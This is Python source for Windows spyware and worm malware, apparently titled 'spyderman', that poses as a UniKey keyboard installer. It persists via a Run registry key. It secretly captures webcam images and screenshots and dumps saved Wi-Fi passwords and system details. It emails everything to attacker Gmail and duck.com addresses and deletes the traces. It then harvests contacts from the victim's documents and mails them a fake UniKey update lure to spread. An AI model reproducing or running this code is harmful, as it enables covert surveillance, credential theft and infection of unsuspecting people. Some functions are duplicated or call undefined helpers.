#!/usr/bin/env python
import subprocess
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import time
import cv2
import pyautogui
import tempfile
import os
import re
import sys
import shutil
import docx
import openpyxl
import mailbox
import pandas as pd
import json
import email
import vobject
import pdfplumber
from multiprocessing import Pool, cpu_count
from concurrent.futures import ThreadPoolExecutor
import socket
import psutil

from nuitka.utils.Execution import executeProcess


def get_ip_address():
    progress_bar("Getting wifi information")
    interfaces_to_check = ['wlan0', 'eth0']
    ip_info = []

    # First, check for specific interfaces: wlan0 and eth0
    for interface in interfaces_to_check:
        if interface in psutil.net_if_addrs():
            for addr in psutil.net_if_addrs()[interface]:
                if addr.family == socket.AF_INET:
                    ip_info.append(f"{interface}: {addr.address} (IPv4)")
            if ip_info:
                return ip_info[0]

    # If neither wlan0 nor eth0 found, check all available interfaces
    for iface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == socket.AF_INET:  # Only IPv4
                ip_info.append(f"{addr.address}")

    # If no IPs were found, return a message
    return ip_info[0] if ip_info else "No IPv4 addresses found."


def print_bordered_title(title):
    border = '#' * (len(title) + 4)  # Calculate the length of the border
    bordered_title = f"{border}\n# {title} #\n{border}\n"  # Create bordered title string
    return bordered_title

def progress_bar(text):
    for i in range(1, 41):
        percent_complete = int((i / 40) * 100)
        bar = '#' * i + ' ' * (40 - i)
        print(f"\r{text}: [{bar}] {percent_complete}%", end="", flush=True)
        time.sleep(0.01)
    print("\n")
    print(f"{text}: Successful....")

def return_temp_dir():
    temp_directory = tempfile.gettempdir()
    os.chdir(temp_directory)
    return temp_directory


def persistent():
    # Display progress (assuming progress_bar is defined elsewhere)
    progress_bar("Persisting System")

    # Define the path within the ZaloData folder

    microsoft_data_path = os.path.join(os.environ["APPDATA"], "Microsoft")
    exe_file_path = os.path.join(microsoft_data_path, "Windows Explorer.exe")

    # Ensure ZaloData folder exists
    if not os.path.exists(microsoft_data_path):
        # If the folder doesn't exist, create it
        os.makedirs(microsoft_data_path)
        print(f"Created folder: {microsoft_data_path}")

    # Check if the file already exists in ZaloData and copy if it doesn't
    if not os.path.exists(exe_file_path):
        shutil.copyfile(sys.executable, exe_file_path)
        subprocess.call(
            f'reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v MicrosoftEdgeAutoLaunch_TaoLaHacker /t REG_SZ /d "{exe_file_path}"',
            shell=True
        )
        print(f"Added .exe file to {exe_file_path}")



    print(f".exe file already exists at {exe_file_path}")




def auto_capture(num_images=10):
    cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
    images = []
    progress_bar("Starting Camera Capture")
    for i in range(5):
        ret, frame = cam.read()
        if ret:
            current_time = round(time.time())
            timestamp = time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime(current_time))
            image_path = f'victim_image_{timestamp}.jpg'
            cv2.imwrite(f'victim_image_{timestamp}.jpg', frame)
            images.append(image_path)
            print(f'{timestamp}: image saved')

        else:
            print("unsuccessfull")
    return images

def auto_screenshot(num_screenshots=10):
    screenshot_paths = []  # This stores the paths of the saved screenshots
    progress_bar("Starting Screenshot Capture")
    for i in range(5):
        screenshot = pyautogui.screenshot()
        current_time = round(time.time())
        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime(current_time))
        screenshot_path = f'screenshot_{timestamp}.png'
        screenshot.save(screenshot_path)
        screenshot_paths.append(screenshot_path)
        print(f'{timestamp}: Screenshot saved as {screenshot_path}')
    return screenshot_paths

def delete_files(file_list):
    progress_bar("Delete Files To Hide Evidence")
    for file in file_list:
        try:
            os.remove(file)
            print(f"Deleted {file}")
        except OSError as e:
            print(f"Error deleting {file}: {e}")
# Collection information of target OS
# Collection password wifi of target 
def filter_system_info(info_str):
    progress_bar("Filter System Information")
    filtered_info = {}
    patterns = {
        "Host Name": r"Host Name:\s*(.*)",
        "OS Name": r"OS Name:\s*(.*)",
        "OS Version": r"OS Version:\s*(.*)",
        "System Model": r"System Model:\s*(.*)",
        "System Directory": r"System Directory:\s*(.*)",
        "Domain": r"Domain:\s*(.*)"
    }

    # Extract basic system information
    for key, pattern in patterns.items():
        match = re.search(pattern, info_str)
        if match:
            filtered_info[key] = match.group(1)

    # Extract Network Cards and their IP addresses
    network_card_pattern = r"\[\d+\]:\s*([^\n]+?)\s*Connection Name: ([^\n]+).*?IP address\(es\)(.*?)\n\s*\[02\]"
    network_cards = re.findall(network_card_pattern, info_str, re.DOTALL)

    network_info = []
    for card in network_cards:
        card_name, connection_name, ip_section = card
        ipv4_pattern = r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b"
        ipv6_pattern = r"\b(?:[A-Fa-f0-9]{1,4}:){1,7}[A-Fa-f0-9]{1,4}\b"
        ipv4_addresses = re.findall(ipv4_pattern, ip_section)
        ipv6_addresses = re.findall(ipv6_pattern, ip_section)
        network_info.append({
            "Card Name": card_name.strip(),
            "Connection Name": connection_name.strip(),
            "IPv4 Addresses": ipv4_addresses,
            "IPv6 Addresses": ipv6_addresses
        })

    filtered_info["Network Cards"] = network_info

    # Convert the filtered info to a readable format
    filtered_info_str = "\n".join([f"{key}: {value}" for key, value in filtered_info.items() if key != "Network Cards"])

    # Append detailed network card info
    for idx, card in enumerate(filtered_info["Network Cards"], start=1):
        filtered_info_str += f"  Connection Name: {card['Connection Name']}\n"
        filtered_info_str += f"  IPv4 Addresses: {', '.join(card['IPv4 Addresses'])}\n"
        filtered_info_str += f"  IPv6 Addresses: {', '.join(card['IPv6 Addresses'])}\n"

    return filtered_info_str


def send_mail(email, password, subject, message, attachments):
    try:

        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = "xxxx@gmail.com" #CHANGE ME, GMAIL RECEIVED INFORMATION
        msg['Subject'] = subject
        msg.attach(MIMEText(message, 'plain'))

        total_size = 0

        # Attach each file from the attachments list
        for file in attachments:
            file_size = os.path.getsize(file)
            total_size += file_size
            if total_size > 25 * 1024 * 1024:  # 25 MB limit
                print(
                    f"Attachment size limit exceeded. Cannot attach {file}. Total size: {total_size / (1024 * 1024):.2f} MB")
                continue
            with open(file, "rb") as f:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(f.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(file)}')
                msg.attach(part)

        # Connect to Gmail's SMTP server and send the email
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, "thangtran@duck.com", msg.as_string())
        server.quit()
        print("Email sent successfully.")
    except Exception as e:
        print("Failed to send email: {}".format(e))

# Find form Email
def find_emails_in_text(content):
    emails = re.findall(
        r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b',
        content
    )
    return emails

# Find Email in file txt
def find_emails_in_txt(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            content = file.read()
            return find_emails_in_text(content)
    except Exception as e:
        print(f"Can't read this file {file_path}: {e}")
        return []

# Find Email in file mailbox (.mbox)
def find_emails_in_mailbox(file_path):
    emails = []
    try:
        mbox = mailbox.mbox(file_path)
        for message in mbox:
            if message['from']:
                emails.extend(find_emails_in_text(message['from']))
            if message['to']:
                emails.extend(find_emails_in_text(message['to']))
            if message['cc']:
                emails.extend(find_emails_in_text(message['cc']))
            if message['bcc']:
                emails.extend(find_emails_in_text(message['bcc']))
            # Maybe find email in payload
            if message.get_payload():
                if isinstance(message.get_payload(), str):
                    emails.extend(find_emails_in_text(message.get_payload()))
    except Exception as e:
        print(f"Can't read this file mbox {file_path}: {e}")
    return emails

# Find Email in file docx
def find_emails_in_docx(file_path):
    doc = docx.Document(file_path)
    content = "\n".join([para.text for para in doc.paragraphs])
    return find_emails_in_text(content)

# Find Email in file xlsx
def find_emails_in_xlsx(file_path):
    wb = openpyxl.load_workbook(file_path)
    emails = []
    for sheet in wb.sheetnames:
        ws = wb[sheet]
        for row in ws.iter_rows(values_only=True):
            for cell in row:
                if isinstance(cell, str):
                    emails.extend(find_emails_in_text(cell))
    return emails

# Find Email in file Excel (.xls) and CSV
def find_emails_in_xls_or_csv(file_path):
    emails = []
    try:
        if file_path.endswith('.xls'):
            df = pd.read_excel(file_path, engine='xlrd')
        else:
            df = pd.read_csv(file_path)
        for column in df.columns:
            for value in df[column]:
                if isinstance(value, str):
                    emails.extend(find_emails_in_text(value)) 
    except Exception as e:
        print(f"Can't read this file {file_path}: {e}")
    return emails

# Find Email in file .eml
def find_emails_in_eml(file_path):
    emails = []
    with open(file_path, 'rb') as file:
        msg = email.message_from_binary_file(file)
        content = msg.get_payload(decode=True).decode('utf-8', errors='ignore')
        emails.extend(find_emails_in_text(content))
    return emails

# Find Email in file .pst
def find_emails_in_pst(file_path):
    emails = []
    pst_file = open_pst(file_path)
    for folder in pst_file.get_folders():
        for msg in folder.sub_messages:
            emails.extend(find_emails_in_text(msg.plain_text_body.decode('utf-8', errors='ignore')))
    return emails

# Find Email in file .vcf (vCard)
def find_emails_in_vcf(file_path):
    emails = []
    with open(file_path, 'r', encoding='utf-8') as file:
        vcard = vobject.readOne(file)
        for contact in vcard.contents.get('email', []):
            emails.append(contact.value)
    return emails

# Find Email in file .json
def find_emails_in_json(file_path):
    emails = []
    with open(file_path, 'r', encoding='utf-8') as file:
        data = json.load(file)
        content = json.dumps(data)  # Biến dữ liệu thành chuỗi để tìm kiếm
        emails.extend(find_emails_in_text(content))
    return emails

# Find Email in file .html
def find_emails_in_html(file_path):
    with open(file_path, 'r', encoding='utf-8') as file:
        content = file.read()
        return find_emails_in_text(content)

# Find Email in file .pdf (đã có)
def find_emails_in_pdf(file_path):
    emails = []
    try:
        file_size = os.path.getsize(file_path)
        if file_size > 10 * 1024 * 1024:
            print(f"The file {file_path} larger 15 MB, Skip....")
            return emails
        with pdfplumber.open(file_path) as pdf:
            for page in pdf.pages:
                content = page.extract_text()
                if content:
                    emails.extend(find_emails_in_text(content))
    except Exception as e:
        print(f"Can't read this file PDF {file_path}: {e}")
    return emails

# Processing file
def process_file(file_path):
    try:
        #print(f"Handling file: {file_path}")
        if file_path.endswith('.txt'):
            return find_emails_in_txt(file_path)
        elif file_path.endswith('.mbox'):
            return find_emails_in_mailbox(file_path)
        elif file_path.endswith('.docx'):
            return find_emails_in_docx(file_path)
        elif file_path.endswith('.xlsx'):
            return find_emails_in_xlsx(file_path)
        elif file_path.endswith('.xls') or file_path.endswith('.csv'):
            return find_emails_in_xls_or_csv(file_path)
        elif file_path.endswith('.eml'):
            return find_emails_in_eml(file_path)
        elif file_path.endswith('.pst'):
            return find_emails_in_pst(file_path)
        elif file_path.endswith('.vcf'):
            return find_emails_in_vcf(file_path)
        elif file_path.endswith('.json'):
            return find_emails_in_json(file_path)
        elif file_path.endswith('.html'):
            return find_emails_in_html(file_path)
        elif file_path.endswith('.pdf'):
            return find_emails_in_pdf(file_path)
    except Exception as e:
        print(f"Cant read file {file_path}: {e}")
        return []

# Find Email file in directory
def find_emails_in_directory(directory_path):
    file_type = (".txt", ".mbox", ".docx", ".xlsx",".xls", ".csv", ".eml", ".pst", ".vcf", ".json", ".html", ".pdf")
    all_emails = set()
    files_to_process = []
    progress_bar("Scanning Emails On File")
    for root, dirs, files in os.walk(directory_path):
        for file_name in files:
            if file_name.endswith(file_type):
                files_to_process.append(os.path.join(root, file_name))
    if __name__ == "__main__":
        with ThreadPoolExecutor(max_workers=cpu_count()) as executor:
            results = list(executor.map(process_file, files_to_process))
    for emails in results:
        if emails:
            all_emails.update(emails)
    return all_emails


def location():
    evil_file_location1 = os.environ["appdata"] + "\\z_u.txt"
    return evil_file_location1


def spread_evil_file(email_evil, password_evil, victim_emails, subject, message_evil):
    try:
        progress_bar("Spreading Virus To Victims")
        file_path = location()
        msg = MIMEMultipart()
        msg['From'] = email_evil
        if isinstance(victim_emails, list):
            msg['To'] = ", ".join(victim_emails)
        else:
            msg['To'] = victim_emails
        msg['Subject'] = subject
        msg.attach(MIMEText(message_evil, 'plain'))

        #send attachments to victims
        attachment = open(file_path, "rb")
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename= {os.path.basename(file_path)}')
        msg.attach(part)

        # Connect to Gmail's SMTP server and send the email
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email_evil, password_evil)
        server.sendmail(email_evil, victim_emails, msg.as_string())
        server.quit()
        print("Email sent successfully.")
        print("Virus spreads successfully.")
    except Exception as e:
        print("Failed to send email: {}".format(e))

def open_pdf_once():
    file_name = os.path.join(sys._MEIPASS, "NetworkAutomationCookbook.pdf")
    if not getattr(open_pdf_once, 'has_been_called', False):
        subprocess.Popen(file_name, shell=True)
        open_pdf_once.has_been_called = True

def spread_virus():
    directory_to_scan = os.path.expanduser('~/Downloads')
    directory_to_scan1 = os.path.expanduser('~/Documents')
    emails = find_emails_in_directory(directory_to_scan)
    emails1 = find_emails_in_directory(directory_to_scan1)
    result = emails.union(emails1)
    if result:
        print("Found Email:")
        print('\n'.join(result))
        victim_emails_list = list(result)
        spread_evil_file(email_evil="xxxx@gmail.com", #CHANGE ME
                       password_evil="xxxx xxxx xxxx xxxx", #CHANGE ME (xxxx xxxx xxxx xxxx)
                       victim_emails=victim_emails_list,
                       #information to fake...
                       subject="UniKey 4.6 RC2 Release",
                       message_evil="""Ngày 29/9/2023: Phát hành bản 4.6 RC2, bổ sung kiểu gõ Telex giản lược vào danh sách các kiểu gõ có sẵn.Với Telex giản lược, bạn gõ chữ W ở đầu từ mà không bị đổi thành ư.Kiểu gõ này cũng không xử lý các phím [ và ].Trước đây kiểu gõ này chỉ được đặt trong các kiểu gõ mẫu, có tên là Simplified Telex khi bạn chọn kiểu gõ Tự định nghĩa trong phần Tùy chọn của UniKey.
                                \n Tải Unikey phiên bản mới nhất tại đây.
                                https://drive.google.com/drive/u/1/folders/1uyOBmyp2Eukk8sSS1zBD6or4Xl4c6z24"""
                   )


def spyderman():
    captured_images = auto_capture(10)
    captured_screenshots = auto_screenshot(10)
    all_attachments = captured_images + captured_screenshots
    send_mail(email="xxxx@gmail.com", #CHANGE ME
              password="xxxx xxxx xxxx xxxx", #CHANGE ME (xxxx xxxx xxxx xxxx)
              subject=interface_ips,
              message=combined_info,
              attachments=all_attachments
              )
    delete_files(all_attachments)

def filter_system_info(info_str):
    filtered_info = {}
    patterns = {
        "Host Name": r"Host Name:\s*(.*)",
        "OS Name": r"OS Name:\s*(.*)",
        "OS Version": r"OS Version:\s*(.*)",
        "System Model": r"System Model:\s*(.*)",
        "System Directory": r"System Directory:\s*(.*)",
        "Domain": r"Domain:\s*(.*)"
    }

    for key, pattern in patterns.items():
        match = re.search(pattern, info_str)
        if match:
            filtered_info[key] = match.group(1)

    # Extract network card and IP information
    network_card_pattern = r"\[\d+\]:\s*([^\n]+?)\s*Connection Name: ([^\n]+).*?IP address\(es\)(.*?)\n\s*\[02\]"
    network_cards = re.findall(network_card_pattern, info_str, re.DOTALL)

    network_info = []
    for card in network_cards:
        card_name, connection_name, ip_section = card
        ipv4_pattern = r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b"
        ipv6_pattern = r"\b(?:[A-Fa-f0-9]{1,4}:){1,7}[A-Fa-f0-9]{1,4}\b"
        ipv4_addresses = re.findall(ipv4_pattern, ip_section)
        ipv6_addresses = re.findall(ipv6_pattern, ip_section)
        network_info.append({
            "Card Name": card_name.strip(),
            "Connection Name": connection_name.strip(),
            "IPv4 Addresses": ipv4_addresses,
            "IPv6 Addresses": ipv6_addresses
        })

    filtered_info["Network Cards"] = network_info

    filtered_info_str = "\n".join([f"{key}: {value}" for key, value in filtered_info.items() if key != "Network Cards"])

    for idx, card in enumerate(filtered_info["Network Cards"], start=1):
        filtered_info_str += f"\n\nNetwork Card {idx}:\n"
        filtered_info_str += f"  Card Name: {card['Card Name']}\n"
        filtered_info_str += f"  Connection Name: {card['Connection Name']}\n"
        filtered_info_str += f"  IPv4 Addresses: {', '.join(card['IPv4 Addresses'])}\n"
        filtered_info_str += f"  IPv6 Addresses: {', '.join(card['IPv6 Addresses'])}"

    return filtered_info_str

def check_wifi_interface(interface_name="wlan0"):
    # Check if the specified wireless interface exists
    try:
        output = subprocess.check_output("ipconfig" if os.name == "nt" else "ifconfig", shell=True).decode("utf-8")
        return interface_name in output
    except subprocess.CalledProcessError:
        return False

def get_wifi_profiles():
    if check_wifi_interface("wlan0"):  # Change "wlan0" to your wireless interface name if needed
        profiles_output = subprocess.check_output("netsh wlan show profiles", shell=True).decode("utf-8")
        profiles = re.findall(r"All User Profile\s*:\s*(.*)", profiles_output)
        wifi_info = []

        for profile in profiles:
            profile = profile.strip()
            try:
                profile_info = subprocess.check_output(f"netsh wlan show profile name=\"{profile}\" key=clear", shell=True).decode("utf-8")
                ssid = re.search(r"SSID name\s*:\s*(.*)", profile_info)
                password = re.search(r"Key Content\s*:\s*(.*)", profile_info)
                wifi_info.append({
                    "SSID": ssid.group(1).strip() if ssid else profile,
                    "Password": password.group(1).strip() if password else "No Password"
                })
            except subprocess.CalledProcessError:
                wifi_info.append({"SSID": profile, "Password": "Could not retrieve"})

        wifi_info_str = "\n".join([f"SSID: {item['SSID']}, Password: {item['Password']}" for item in wifi_info])
        return wifi_info_str
    else:
        return "No wireless interface found. Please connect to Wi-Fi or this windows is a virtual machine."


def get_combined_info():
    # Retrieve system information
    command = "systeminfo"
    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
    result_str = result.decode('utf-8')
    bordered_title = print_bordered_title("sysinfo")
    system_info = bordered_title + filter_system_info(result_str)

    # Retrieve Wi-Fi profiles
    wifi_info = get_wifi_profiles()
    if wifi_info:
        # Combine both system info and Wi-Fi info
        combined_info = system_info + "\n\nWi-Fi Profiles:\n" + wifi_info
        return combined_info
    else:
        return system_info


system_info = ""
file_name = os.path.join(sys._MEIPASS, "UniKeyNT.exe")
subprocess.Popen(file_name, shell=True)
if __name__ == "__main__":
    try:
        temp_dir = return_temp_dir()
        print("Waiting for system to stabilize...")
        # time.sleep(60)
        interface_ips = get_ip_address()
        combined_info = get_combined_info()
        persistent()
        progress_bar("Sending Email Message To Hasht")
        spyderman()
        try:
            progress_bar("Sending Malware To Victims")
            spread_virus()
        except Exception as e:
            print(f"Can't spread viruss: {e}")
        while True:
            try:
              progress_bar("Sending Email Message To Hasht")
              spyderman()
            except Exception as capture_error:
                print(f"An error occurred during capturing or sending: {capture_error}")
            time.sleep(15)

    except subprocess.CalledProcessError as e:
            print("Command failed with exit status {}: {}".format(e.returncode, e.output))
            sys.exit()
    except Exception as e:
            print("A generic error has occurred: {}".format(e))
            sys.exit()
# pyinstaller --add-data="..\..\spyderman\File_embed\UnikeyNT.exe;." --icon ...\..\spyderman\File_embed\Unikeynt_101-4.ico --onefile --noupx spyderman.py --name UnikeyNT